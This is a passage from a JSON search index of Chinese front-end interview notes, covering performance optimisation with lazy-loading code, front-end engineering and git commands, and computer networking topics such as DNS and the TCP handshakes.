的值，当这些值发生变化时，执行处理操作\",\"不一定要返回某个值\",\"支持异步\",\"使用场景：\",\"当目的是进行数值计算，且依赖于其他数据，那么推荐使用 computed\",\"当需要在某个数据发生变化的同时做一些稍复杂的逻辑操作，那么推荐使用 watch\"]},{\"header\":\"8. computed和methods的区别\",\"slug\":\"_8-computed和methods的区别\",\"contents\":[\"可以将同一函数定义为一个 method 或者一个计算属性。对于最终的结果，两种方式是相同的\",\"不同点：\",\"computed: 计算属性是基于它们的依赖进行缓存的，只有在它的相关依赖发生改变时才会重新求值\",\"method 调用总会执行该函数\"]}]},\"/front-end/Interview-notes/05-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html\":{\"title\":\"性能优化\",\"contents\":[{\"header\":\"1. 回流（重排）和重绘\",\"slug\":\"_1-回流-重排-和重绘\",\"contents\":[\"回流必将引起重绘，重绘不一定会引起回流\"]},{\"header\":\"1. 回流（重排）\",\"slug\":\"_1-回流-重排\",\"contents\":[\"当DOM结构中的元素改变尺寸、宽高、边框、内容、位置时，导致需要重新构建页面的过程\",\"会导致回流的操作：\",\"增删可见的 DOM 元素时\",\"元素的尺寸或位置发生改变\",\"元素内容发生改变\",\"元素字体大小变化\",\"页面首次渲染\",\"浏览器窗口大小发生改变\",\"激活CSS伪类（例如:hover）\",\"获取一些特定属性的值 \",\"offsetTop、offsetLeft、 offsetWidth、offsetHeight、scrollTop、scrollLeft、scrollWidth、scrollHeight、clientTop、clientLeft、clientWidth、clientHeight\",\"这些属性有一个共性，就是需要通过即时计算得到。因此浏览器为了获取这些值，也会进行回流\"]},{\"header\":\"2. 重绘\",\"slug\":\"_2-重绘\",\"contents\":[\"当页面中元素的样式发生改变，但没有改变它在文档流中的位置时，导致浏览器重新绘制的过程\",\"会导致重绘的操作：\",\"颜色的修改\",\"文本方向的修改\",\"阴影的修改\",\"注意：当触发回流时，一定会触发重绘，但是重绘不一定会引发回流\"]},{\"header\":\"3. 如何减少\",\"slug\":\"_3-如何减少\",\"contents\":[\"如果想设定元素的样式，通过改变元素的 class 类名 (尽可能在 DOM 树的最里层)\",\"避免设置多项内联样式\",\"应用元素的动画，使用 position 属性的 fixed 值或 absolute 值\",\"避免使用 table 布局，table 中每个元素的大小以及内容的改动，都会导致整个 table 的重新计算\",\"对于那些复杂的动画，对其设置 position: fixed/absolute，尽可能地使元素脱离文档流，从而减少对其他元素的影响\",\"使用CSS3硬件加速，可以让transform、opacity、filters这些动画不会引起回流重绘\",\"避免使用 CSS 的 JavaScript 表达式\"]},{\"header\":\"4. documentFragment 是什么？用它跟直接操作 DOM 的区别是什么？\",\"slug\":\"_4-documentfragment-是什么-用它跟直接操作-dom-的区别是什么\",\"contents\":[]},{\"header\":\"2. 服务端渲染与客户端渲染\",\"slug\":\"_2-服务端渲染与客户端渲染\",\"contents\":[]},{\"header\":\"1. 基本概念\",\"slug\":\"_1-基本概念\",\"contents\":[\"SSR （server side render）服务端渲染，是指由服务侧（server side）完成页面的DOM结构拼接，然后发送到浏览器，为其绑定状态与事件，成为完全可交互页面的过程 CSR（client side render）客户端渲染，是指由客户端（client side）JS完成页面和数据的拼接，生成DOM结构再交由浏览器渲染成页面的过程 SPA（single page application）单页面应用，只是局部更新内容。SPA实现的原理就采用了CSR，页面中所有内容由JS控制，需要浏览器进行JS解析才能显示出来 SEO（search engine optimization）搜索引擎优化，利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名\"]},{\"header\":\"2. 服务端渲染\",\"slug\":\"_2-服务端渲染\",\"contents\":[\"面试笔记-性能优化01.png\",\"前端耗时少：因为后端拼接了html，浏览器只需直接渲染出来\",\"不利于前后端分离，开发效率低\",\"有利于SEO：因为在后端有完整的html页面，所以爬虫更容易爬取获得信息，更有利于SEO\",\"后端生成静态化文件。即生成缓存片段，这样就可以减少数据库查询浪费的时间了，且对于数据变化不大的页面非常高效\",\"占用服务器端资源：无需占用客户端资源。即解析模板的工作完全交由后端来做\"]},{\"header\":\"3. 客户端渲染\",\"slug\":\"_3-客户端渲染\",\"contents\":[\"面试笔记-性能优化02.png\",\"客户端渲染适合构建交互性强的应用，而服务端渲染适合需要更好的 SEO、更快的首屏渲染速度和更好的性能的应用\"]},{\"header\":\"3. CDN\",\"slug\":\"_3-cdn\",\"contents\":[\"CDN (全称 Content Delivery Network)，即内容分发网络\",\"CDN的原理是尽可能的在各个地方分布机房缓存数据，这样即使我们的根服务器在国外，在国内的用户也可以通过国内的机房迅速加载资源\",\"CDN就是根据用户位置分配最近的资源\",\"通过CDN的负载均衡系统，智能调度边缘节点提供服务，相当于CDN服务的大脑，而缓存系统相当于CDN的心脏，缓存命中直接返回给用户，否则回源\",\"作用：\",\"CDN有助于防御DDOS、MITM等网络攻击\",\"减少了服务器负载\",\"用户收到的内容来自最近的数据中心，延迟更低，内容加载更快\"]},{\"header\":\"4. 懒加载\",\"slug\":\"_4-懒加载\",\"contents\":[]},{\"header\":\"1. 什么是懒加载\",\"slug\":\"_1-什么是懒加载\",\"contents\":[\"懒加载也叫做延迟加载、按需加载，可视化区域之外的图片不会进行加载，在滚动屏幕时才加载，这样使得网页的加载速度更快，减少了服务器的负载。懒加载适用于图片（长列表）的场景中\"]},{\"header\":\"2. 实现原理\",\"slug\":\"_2-实现原理\",\"contents\":[\"图片的加载是由src引起的，当对src赋值时，浏览器就会请求图片资源。根据这个原理，我们使用HTML5 的data-xxx属性来储存图片的路径，在需要加载图片的时候，将data-xxx中图片的路径赋值给src，这样就实现了图片的按需加载，即懒加载\",\"还可以给img的loading属性设为lazy\"]},{\"header\":\"3. 代码实现\",\"slug\":\"_3-代码实现\",\"contents\":[\"scroll版：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>懒加载</title> <style> /* 一定记得设置图片高度 */ img { display: block; margin-bottom: 50px; height: 200px; } </style> </head> <body> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/01.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/02.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/03.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/04.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/05.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/06.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/07.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/08.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/09.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/10.jpg\\\" /> <script> function lazyLoad() { // 用属性选择器返回属性名为data-src的img元素列表 let imgs = document.querySelectorAll('img[data-src]'); imgs.forEach((item) => { if (item.dataset.src === '') return; if (isElementInViewport(item)) { item.src = item.dataset.src; item.removeAttribute('data-src'); //移除属性，下次不再遍历 } }); } function isElementInViewport(element) { const rect = element.getBoundingClientRect(); // 用于获得页面中某个元素的左，上，右和下分别相对浏览器视窗的位置 return ( rect.top >= 0 && rect.left >= 0 && rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && rect.right <= (window.innerWidth || document.documentElement.clientWidth) ); } lazyLoad(); //刚开始还没滚动屏幕时，要先触发一次函数，初始化首页的页面图片 document.addEventListener('scroll', lazyLoad); </script> </body> </html> \",\"window.innerHeight 是浏览器可视区的高度\",\"document.body.scrollTop || document.documentElement.scrollTop 是浏览器滚动的过的距离\",\"imgs.offsetTop 是元素顶部距离文档顶部的高度（包括滚动条的距离）\",\"图片加载条件：img.offsetTop <= window.innerHeight + document.body.scrollTop;\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>懒加载</title> <style> /* 一定记得设置图片高度 */ img { display: block; margin-bottom: 50px; height: 200px; } </style> </head> <body> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/01.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/02.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/03.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/04.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/05.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/06.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/07.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/08.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/09.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/10.jpg\\\" /> <script> function lazyLoad() { // 用属性选择器返回属性名为data-src的img元素列表 let imgs = document.querySelectorAll('img[data-src]'); imgs.forEach((item) => { if (item.dataset.src === '') return; if (isElementInViewport(item)) { item.src = item.dataset.src; item.removeAttribute('data-src'); //移除属性，下次不再遍历 } }); } function isElementInViewport(el) { // viewPortHeight 兼容所有浏览器写法 const viewPortHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight; const offsetTop = el.offsetTop; const scrollTop = document.documentElement.scrollTop; return offsetTop <= viewPortHeight + scrollTop; } lazyLoad(); //刚开始还没滚动屏幕时，要先触发一次函数，初始化首页的页面图片 document.addEventListener('scroll', lazyLoad); </script> </body> </html> \",\"IntersectionObserver版：\",\"Intersection Observer 即重叠观察者，从这个命名就可以看出它用于判断两个元素是否重叠，因为不用进行事件的监听，性能方面相比getBoundingClientRect会好很多\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>懒加载</title> <style> /* 一定记得设置图片高度 */ img { display: block; margin-bottom: 50px; height: 200px; } </style> </head> <body> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/01.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/02.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/03.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/04.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/05.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/06.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/07.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/08.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/09.jpg\\\" /> <img src=\\\"./风景图/default.jpg\\\" data-src=\\\"./风景图/10.jpg\\\" /> <script> const images = document.querySelectorAll('img[data-src]'); function handleIntersection(entries, observer) { entries.forEach((entry) => { if (entry.isIntersecting) { const image = entry.target; image.src = image.dataset.src; image.removeAttribute('data-src'); observer.unobserve(image); } }); } const observer = new IntersectionObserver(handleIntersection); images.forEach((image) => { observer.observe(image); }); </script> </body> </html> \"]},{\"header\":\"5. 节流与防抖\",\"slug\":\"_5-节流与防抖\",\"contents\":[\"详见：节流与防抖\"]},{\"header\":\"6. 图片优化\",\"slug\":\"_6-图片优化\",\"contents\":[]},{\"header\":\"1. 项目中图片的优化\",\"slug\":\"_1-项目中图片的优化\",\"contents\":[\"不用图片。很多时候会使用到很多修饰类图片，其实这类修饰图片完全可以用 CSS 去代替\",\"对于移动端来说，屏幕宽度就那么点，完全没有必要去加载原图浪费带宽。一般图片都用 CDN 加载，可以计算出适配屏幕的宽度，然后去请求相应裁剪好的图片\",\"小图使用 base64 格式\",\"将多个图标文件整合到一张图片中（雪碧图）\",\"选择正确的图片格式： \",\"对于能够显示 WebP 格式的浏览器尽量使用 WebP 格式。因为 WebP 格式具有更好的图像数据压缩算法，能带来更小的图片体积，而且拥有肉眼识别无差异的图像质量，缺点就是兼容性并不好\",\"小图使用 PNG，其实对于大部分图标这类图片，完全可以使用 SVG 代替\",\"照片使用 JPEG\"]},{\"header\":\"2. 如何选择图片格式\",\"slug\":\"_2-如何选择图片格式\",\"contents\":[\"图片格式\",\"压缩方式\",\"透明度\",\"动画\",\"浏览器兼容\",\"适应场景\",\"JPEG\",\"有损压缩\",\"不支持\",\"不支持\",\"所有\",\"复杂颜色及形状、尤其是照片\",\"GIF\",\"无损压缩\",\"支持\",\"支持\",\"所有\",\"简单颜色、动画\",\"PNG\",\"无损压缩\",\"支持\",\"不支持\",\"所有\",\"需要透明度时\",\"APNG\",\"无损压缩\",\"支持\",\"支持\",\"Firefox、Safari、IOS Safari\",\"需要半透明效果的动画\",\"WebP\",\"有损压缩\",\"支持\",\"支持\",\"Chrome、Opera、Android、Chrome Android、Browser\",\"复杂颜色以及形状，浏览器平台可预知\",\"SVG\",\"无损压缩\",\"支持\",\"支持\",\"所有（IE8以上）\",\"简单图形，需要良好的缩放体验，需要动态控制图片特效\"]},{\"header\":\"7. 如何提高webpack的打包速度\",\"slug\":\"_7-如何提高webpack的打包速度\",\"contents\":[\"优化babel-loader缓存\",\"IgnorePlugin 忽略某些包，避免引入无用模块（直接不引入，需要在代码中引入）\",\"noParse 避免重复打包（引入但不打包）\",\"多线程打包，使用thread-loader\",\"JS单线程的，开启多进程打包\",\"提高构建速度(特别是多核CPU)\",\"自动刷新（开发环境）与热更新（开发环境）\",\"自动刷新：整个网页全部刷新，速度较慢，状态会丢失\",\"热更新：新代码生效，网页不刷新，状态不丢失\",\"动态链接库DLLPlugin\",\"只适用于开发环境,因为生产环境下打包一次就完了,没有必要用于生产环境）\",\"前端框架如react、vue体积大，构建慢\",\"较稳定，不常升级版本，同一个版本只构建一次，不用每次都重新构建\",\"webpack已内置DllPlugin，不需要安装\",\"DllPlugin打包出dll文件\",\"DllReferencePlugin引用dll文件\"]},{\"header\":\"8. 如何减少webpack打包体积\",\"slug\":\"_8-如何减少webpack打包体积\",\"contents\":[\"按需加载\",\"Scope Hoisting，Scope Hoisting 会分析出模块之间的依赖关系，尽可能的把打包出来的模块合并到一个函数中去\",\"Tree Shaking，Tree Shaking 可以实现删除项目中未被引用的代码\"]}]},\"/front-end/Interview-notes/06-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96.html\":{\"title\":\"前端工程化\",\"contents\":[{\"header\":\"1. 设计模式\",\"slug\":\"_1-设计模式\",\"contents\":[]},{\"header\":\"1. 什么是设计模式\",\"slug\":\"_1-什么是设计模式\",\"contents\":[\"在软件工程中，设计模式是对软件设计中普遍存在的各种问题所提出的解决方案\",\"设计模式并不直接用来完成代码的编写，而是描述在各种不同情况下，要怎么解决问题的一种方案\"]},{\"header\":\"2. 常见的设计模式\",\"slug\":\"_2-常见的设计模式\",\"contents\":[\"单例模式 \",\"全局唯一的实例\",\"保证一个类仅有一个实例，并提供一个访问它的全局访问点\",\"实现的方法为先判断实例存在与否，如果存在则直接返回，如果不存在就创建了再返回，这就确保了一个类只有一个实例对象\",\"如Vuex中的store\",\"如登录框\",\"工厂模式 \",\"工厂模式通常会分成3个角色： \",\"工厂角色-负责实现创建所有实例的内部逻辑\",\"抽象产品角色-是所创建的所有对象的父类，负责描述所有实例所共有的公共接口\",\"具体产品角色-是创建目标，所有创建的对象都充当这个角色的某个具体类的实例\",\"策略模式 \",\"策略模式，就是定义一系列的算法，把他们一个个封装起来，并且使他们可以相互替换\",\"代理模式 \",\"为对象提供一个代用品或占位符，以便控制对它的访问\",\"例如实现图片懒加载的功能，先通过一张loading图占位，然后通过异步的方式加载图片，等图片加载好了再把完成的图片加载到img标签里面\",\"如ES6 Proxy实现Vue3响应式\",\"装饰者模式 \",\"在不改变对象自身的基础上，在程序运行期间给对象动态地添加方法\",\"通常运用在原有方法维持不变，在原有方法上再挂载其他方法来满足现有需求\",\"发布订阅模式 \",\"一种对象间一对多的依赖关系，当一个对象的状态发生改变时，所依赖它的对象都将得到状态改变的通知\",\"广泛应用于异步编程中(替代了传递回调函数)\"]},{\"header\":\"2. require与import的区别与使用\",\"slug\":\"_2-require与import的区别与使用\",\"contents\":[\"区别：\",\"规范：require是CommonJS规范的模块化语法，import是ECMAScript 6规范的模块化语法，如果要兼容浏览器的话必须转化成ES5的语法；CommonJS模块默认export的是一个对象，即使导出的是基础数据类型\",\"本质：require是赋值过程，其实require 的结果就是对象、数字、字符串、函数等，再把require的结果赋值给某个变量，引入复杂数据类型时，数据浅拷贝该对象。import是解构过程\",\"加载：require是运行时加载，import是编译时加载\",\"位置：require可以写在代码的任意位置，import只能写在文件的最顶端且不可在条件语句或函数作用域中使用\",\"改变：require通过module.exports导出的值就不能再变，import通过export导出的值可以改变\",\"使用：\",\"CommonJS标准：\",\"导出：\",\"module.exports = { 对外属性名: 模块内私有变量 } \",\"导出：\",\"const 变量名 = require('模块名或路径'); // Node.js 环境内置模块直接写模块名（例如：fs，path，http） // 自定义模块：写模块文件路径（例如：./utils.js) \",\"例如：\",\"const moduleA = require('moduleA'); const func1 = moduleA.func1; const func2 = moduleA.func2; \",\"ECMAScript 6标准：\",\"导出：\",\"export default { 对外属性名: 模块内私有变量 } \",\"导入：\",\"import 变量名 from '模块名或路径'; \",\"例如：\",\"import { func1, func2 } from 'moduleA'; module.exports/export \"]},{\"header\":\"3. JavaScript的运行环境\",\"slug\":\"_3-javascript的运行环境\",\"contents\":[\"脚本语言需要一个解析器才能运行，每一种解析器都是一个运行环境\",\"JavaScript是脚本语言，在不同的位置有不一样的解析器\"]},{\"header\":\"1. 浏览器\",\"slug\":\"_1-浏览器\",\"contents\":[\"写入HTML的JavaScript，浏览器是它的解析器角色\",\"浏览器中的JavaScript的用途是操作DOM，浏览器就提供了document之类的内置对象\"]},{\"header\":\"2. Node\",\"slug\":\"_2-node\",\"contents\":[\"Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境，独立于浏览器的运行环境\",\"Node.js中的JavaScript的用途是操作磁盘文件或搭建HTTP服务器，Node.js就相应提供了fs,http等内置对象\"]},{\"header\":\"4. git和svn的区别\",\"slug\":\"_4-git和svn的区别\",\"contents\":[\"git 和 svn 最大的区别在于 git 是分布式的，而 svn 是集中式的。因此我们不能再离线的情况下使用 svn。如果服务器出现问题，就没有办法使用 svn 来提交代码\",\"svn 中的分支是整个版本库的复制的一份完整目录，而 git 的分支是指针指向某次提交，因此 git 的分支创建更快开销更小并且分支上的变化不会影响到其他人。svn 的分支变化会影响到所有的人\",\"svn 的指令相对于 git 来说要简单一些，比 git 更容易上手\",\"git把内容按元数据方式存储，而svn是按文件：因为git目录是处于个人机器上的一个克隆版的版本库，它拥有中心版本库上所有的东西，例如标签，分支，版本记录等\",\"git分支和svn的分支不同：svn会发生分支遗漏的情况，而git可以同一个工作目录下快速的在几个分支间切换，很容易发现未被合并的分支，简单而快捷的合并这些文件\",\"git没有一个全局的版本号，而svn有\",\"git的内容完整性要优于svn：git的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏\"]},{\"header\":\"5. 常用git命令\",\"slug\":\"_5-常用git命令\",\"contents\":[\"git init // 新建 git 代码库 git add // 添加指定文件到暂存区 git rm // 删除工作区文件，并且将这次删除放入暂存区 git commit -m [message] // 提交暂存区到仓库区 git branch // 列出所有分支 git checkout -b [branch] // 新建一个分支，并切换到该分支 git status // 显示有变更文件的状态 \"]},{\"header\":\"6. git pull 和 git fetch 的区别\",\"slug\":\"_6-git-pull-和-git-fetch-的区别\",\"contents\":[\"git fetch 只是将远程仓库的变化下载下来，并没有和本地分支合并\",\"git pull 会将远程仓库的变化下载下来，并和当前分支合并\"]},{\"header\":\"7. git rebase 和 git merge 的区别\",\"slug\":\"_7-git-rebase-和-git-merge-的区别\",\"contents\":[\"git merge 和 git rebase 都是用于分支合并，关键在 commit 记录的处理上不同：\",\"git merge 会新建一个新的 commit 对象，然后两个分支以前的 commit 记录都指向这个新 commit 记录。这种方法会保留之前每个分支的 commit 历史\",\"git rebase 会先找到两个分支的第一个共同的 commit 祖先记录，然后将提取当前分支这之后的所有 commit 记录，然后将这个 commit 记录添加到目标分支的最新提交后面。经过这个合并后，两个分支合并后的 commit 记录就变为了线性的记录了\"]}]},\"/front-end/Interview-notes/07-%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.html\":{\"title\":\"计算机网络\",\"contents\":[{\"header\":\"1. 从输入URL到网页显示的完整过程\",\"slug\":\"_1-从输入url到网页显示的完整过程\",\"contents\":[]},{\"header\":\"1. 解析URL\",\"slug\":\"_1-解析url\",\"contents\":[\"首先会对 URL 进行解析，分析所需要使用的传输协议和请求的资源的路径。如果输入的 URL 中的协议或者主机名不合法，将会把地址栏中输入的内容传递给搜索引擎。如果没有问题，浏览器会检查 URL 中是否出现了非法字符，如果存在非法字符，则对非法字符进行转义后再进行下一过程\"]},{\"header\":\"2. 缓存判断\",\"slug\":\"_2-缓存判断\",\"contents\":[\"浏览器会判断所请求的资源是否在缓存里，如果请求的资源在缓存里并且没有失效，那么就直接使用，否则向服务器发起新的请求\"]},{\"header\":\"3. DNS解析\",\"slug\":\"_3-dns解析\",\"contents\":[\"首先需要获取的是输入的 URL 中的域名的 IP 地址，首先会判断本地是否有该域名的 IP 地址的缓存，如果有则使用，如果没有则向本地 DNS 服务器发起请求。本地 DNS 服务器也会先检查是否存在缓存，如果没有就会先向根域名服务器发起请求，获得负责的顶级域名服务器的地址后，再向顶级域名服务器请求，然后获得负责的权威域名服务器的地址后，再向权威域名服务器发起请求，最终获得域名的 IP 地址后，本地 DNS 服务器再将这个 IP 地址返回给请求的用户。用户向本地 DNS 服务器发起请求属于递归请求，本地 DNS 服务器向各级域名服务器发起请求属于迭代请求\"]},{\"header\":\"4. 获取MAC地址\",\"slug\":\"_4-获取mac地址\",\"contents\":[\"当浏览器得到 IP 地址后，数据传输还需要知道目的主机 MAC 地址，因为应用层下发数据给传输层，TCP 协议会指定源端口号和目的端口号，然后下发给网络层。网络层会将本机地址作为源地址，获取的 IP 地址作为目的地址。然后将下发给数据链路层，数据链路层的发送需要加入通信双方的 MAC 地址，本机的 MAC 地址作为源 MAC 地址，目的 MAC 地址需要分情况处理。通过将 IP 地址与本机的子网掩码相与，可以判断是否与请求主机在同一个子网里，如果在同一个子网里，可以使用 ARP 协议获取到目的主机的 MAC 地址，如果不在一个子网里，那么请求应该转发给网关，由它代为转发，此时同样可以通过 ARP 协议来获取网关的 MAC 地址，此时目的主机的 MAC 地址应该为网关的地址\"]},{\"header\":\"5. TCP三次握手\",\"slug\":\"_5-tcp三次握手\",\"contents\":[\"首先客户端向服务器发送一个 SYN 连接请求报文段和一个随机序号，服务端接收到请求后向客户端发送一个 SYN ACK报文段，确认连接请求，并且也向客户端发送一个随机序号。客户端接收服务器的确认应答后，进入连接建立的状态，同时向服务器也发送一个ACK确认报文段，服务器端接收到确认后，也进入连接建立状态，此时双方的连接就建立起来了\"]},{\"header\":\"6. HTTPS握手\",\"slug\":\"_6-https握手\",\"contents\":[\"如果使用的是 HTTPS 协议，在通信前还存在 TLS 的一个四次握手的过程。首先由客户端向服务器端发送使用的协议的版本号、一个随机数和可以使用的加密方法。服务器端收到后，确认加密的方法，也向客户端发送一个随机数和自己的数字证书。客户端收到后，首先检查数字证书是否有效，如果有效，则再生成一个随机数，并使用证书中的公钥对随机数加密，然后发送给服务器端，并且还会提供一个前面所有内容的 hash 值供服务器端检验。服务器端接收后，使用自己的私钥对数据解密，同时向客户端发送一个前面所有内容的 hash 值供客户端检验。这个时候双方都有了三个随机数，按照之前所约定的加密方法，使用这三个随机数生成一把秘钥，以后双方通信前，就使用这个秘钥对数据进行加密后再传输\"]},{\"header\":\"7. 返回数据\",\"slug\":\"_7-返回数据\",\"contents\":[\"当页面请求发送到服务器端后，服务器端会返回一个 html 文件作为响应，浏览器接收到响应后，开始对 html 文件进行解析，开始页面的渲染过程\"]},{\"header\":\"8. 页面渲染\",\"slug\":\"_8-页面渲染\",\"contents\":[\"浏览器首先会根据 html 文件构建 DOM 树，根据解析到的 css 文件构建 CSSOM 树，如果遇到 script 标签，则判断是否含有 defer 或者 async 属性，要不然 script 的加载和执行会造成页面的渲染的阻塞。当 DOM 树和 CSSOM 树建立好后，根据它们来构建渲染树。渲染树构建好后，会根据渲染树来进行布局。布局完成后，最后使用浏览器的 UI 接口对页面进行绘制。这个时候整个页面就显示出来了\"]},{\"header\":\"9. TCP四次挥手\",\"slug\":\"_9-tcp四次挥手\",\"contents\":[\"TCP 断开连接的四次挥手过程。若客户端认为数据发送完成，则它需要向服务端发送连接释放请求。服务端收到连接释放请求后，会告诉应用层要释放 TCP 连接。然后会发送 ACK 包，并进入 CLOSE_WAIT 状态，此时表明客户端到服务端的连接已经释放，不再接收客户端发的数据了。但是因为 TCP 连接是双向的，所以服务端仍旧可以发送数据给客户端。服务端如果此时还有没发完的数据会继续发送，完毕后会向客户端发送连接释放请求，然后服务端便进入 LAST-ACK 状态。客户端收到释放请求后，向服务端发送确认应答，此时客户端进入 TIME-WAIT 状态。该状态会持续 2MSL（最大段生存期，指报文段在网络中生存的时间，超时会被抛弃） 时间，若该时间段内没有服务端的重发请求的话，就进入 CLOSED 状态。当服务端收到确认应答后，也便进入 CLOSED 状态\"]},{\"header\":\"2. DNS\",\"slug\":\"_2-dns\",\"contents\":[]},{\"header\":\"1. DNS协议是什么\",\"slug\":\"_1-dns协议是什么\",\"contents\":[\"概念：DNS 是域名系统 (Domain Name System) 的缩写，提供的是一种主机名到 IP 地址的转换服务，就是我们常说的域名系统。它是一个由分层的 DNS 服务器组成的分布式数据库，是定义了主机如何查询这个分布式数据库的方式的应用层协议。能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串\",\"作用： 将域名解析为IP地址，客户端向DNS服务器（DNS服务器有自己的IP地址）发送域名查询请求，DNS服务器告知客户机Web服务器的 IP 地址\"]},{\"header\":\"2. DNS同时使用TCP和UDP协议\",\"slug\":\"_2-dns同时使用tcp和udp协议\",\"contents\":[\"DNS占用53号端口，同时使用TCP和UDP协议\",\"在区域传输的时候使用TCP协议\",\"在域名解析的时候使用UDP协议\"]},{\"header\":\"3. DNS查询流程\",\"slug\":\"_3-dns查询流程\",\"contents\":[\"客户端发起一个DNS请求，先查看本地浏览器是否有这个域名的缓存，有则解析结束\",\"没有则去看操作系统是否有缓存，有则解析结束\",\"没有则去看本地host文件，有则解析结束\",\"没有则发送该请求到本地DNS服务器，如果本地DNS服务器存在则返回\",\"不存在本地DNS服务器则请求根域名服务器，比如请求www.baidu.com，根域名服务器告诉本地DNS .com顶级域名服务器的位置\",\"本地DNS服务器收到顶级域名服务器位置后则向顶级域名服务器请求www.baidu.com的IP地址，顶级域名服务器收到后则告诉本地DNS服务器www.baidu.com的权威域名服务器地址\",\"本地DNS服务器再向权威DNS服务器发起请求，权威DNS服务器查询后将对应的IP地址告诉本地DNS\",\"本地DNS服务器缓存该域名与对应IP然后返回IP给客户端\",\"浏览器根据TTL缓存该值\",\"注意：其中1-4为递归查询，5-7为迭代查询\"]},{\"header\":\"3. OSI七层模型\",\"slug\":\"_3-osi七层模型\",\"contents\":[\"ISO为了更好的使网络应用更为普及，推出了OSI参考模型\",\"面试笔记-计算机网络01.png\"]},{\"header\":\"1. 应用层\",\"slug\":\"_1-应用层\",\"contents\":[\"应用层位于 OSI 参考模型的第七层，其作用是通过应用程序间的交互来完成特定的网络应用\",\"该层协议定义了应用进程之间的交互规则，通过不同的应用层协议为不同的网络应用提供服务。例如域名系统 DNS，支持万维网应用的 HTTP 协议，电子邮件系统采用的 SMTP 协议等\",\"在应用层交互的数据单元我们称之为报文\",\"文件传输、电子邮件、文件服务、虚拟终端\"]},{\"header\":\"2. 表示层\",\"slug\":\"_2-表示层\",\"contents\":[\"表示层的作用是使通信的应用程序能够解释交换数据的含义，其位于 OSI 参考模型的第六层，向上为应用层提供服务，向下接收来自会话层的服务\",\"该层提供的服务主要包括数据压缩，数据加密以及数据描述，使应用程序不必担心在各台计算机中表示和存储的内部格式差异\",\"数据格式化、代码转换、数据加密\"]},{\"header\":\"3. 会话层\",\"slug\":\"_3-会话层\",\"contents\":[\"会话层就是负责建立、管理和终止表示层实体之间的通信会话\",\"该层提供了数据交换的定界和同步功能，包括了建立检查点和恢复方案的方法\",\"解除或建立与别的节点的联系\"]},{\"header\":\"4. 传输层\",\"slug\":\"_4-传输层\",\"contents\":[\"传输层的主要任务是为两台主机进程之间的通信提供服务，处理数据包错误、数据包次序，以及其他一些关键传输问题\",\"传输层向高层屏蔽了下层数据通信的细节。因此，它是计算机通信体系结构中关键的一层\",\"其中，主要的传输层协议是TCP和UDP\",\"提供端对端的接口\"]},{\"header\":\"5. 